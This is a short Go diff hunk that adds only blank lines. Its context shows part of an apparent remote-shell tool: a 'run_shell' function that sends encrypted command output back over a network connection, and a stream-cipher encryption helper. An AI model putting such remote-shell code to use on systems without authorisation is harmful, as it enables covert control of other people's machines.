@@ -52,6 +52,7 @@ func run_shell(conn net.Conn) {
             output := string(enc_cmdout) + "\n"
             conn.Write([]byte(output))
         }
+
     }
 }
 
@@ -74,5 +75,6 @@ func encryption(encrypt bool, key []byte, message string) (result string) {
         stream.XORKeyStream(cipherText, cipherText)
         result = string(cipherText)
     }
+
     return
 }
